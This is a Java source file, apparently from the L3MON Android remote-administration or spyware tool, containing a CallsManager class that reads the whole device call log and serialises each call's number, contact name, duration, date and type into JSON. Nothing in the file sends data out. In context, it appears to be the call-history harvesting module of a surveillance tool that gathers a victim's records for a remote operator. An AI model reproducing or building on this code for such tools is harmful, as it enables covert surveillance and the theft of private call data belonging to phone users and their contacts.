package com.etechd.l3mon;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallsManager {

    public static JSONObject getCallsLogs(){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
                String date = cur.getString(cur.getColumnIndex(CallLog.Calls.DATE));

                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("date", date);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

}
